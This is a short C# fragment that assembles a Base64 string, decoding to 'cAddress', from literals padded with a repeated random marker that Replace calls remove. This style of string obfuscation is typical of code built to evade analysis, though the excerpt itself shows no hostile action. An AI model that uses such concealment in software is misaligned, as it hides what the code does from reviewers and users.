                "SArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1Y0FkSArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1"
                    .Replace("SArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1",
                        "");
            input +=
                "SArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1ZHJlSArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1"
                    .Replace("SArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1",
                        "");
            input +=
                "SArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1c3M=SArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1"
                    .Replace("SArHAsZobFvOOn8uKwAdThzbi2P9Iyo2OSMUS2wyYQ6At8QakfHZuXKvKQjIdagnb296ancS9MFClzrklzZmqPI1",
                        "");
            return input;
        }
    }
}